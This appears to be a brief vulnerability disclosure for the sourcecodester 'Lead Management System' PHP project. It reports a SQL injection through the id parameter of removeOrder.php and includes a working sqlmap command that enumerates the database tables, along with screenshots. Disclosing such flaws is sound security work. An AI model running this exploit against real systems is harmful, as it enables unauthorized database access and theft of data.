vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/208411177-fee294c2-0e3e-4b8b-bd0c-897078d304c5.png)


EXP:

```
sqlmap.py -u "http://192.168.31.50/penglead/php_action/removeOrder.php?id=1" --dbms=mysql -D penglead --tables
```
![image](https://user-images.githubusercontent.com/30823782/208411225-ba3a35fb-8e2d-43f3-86f5-1e1543298700.png)

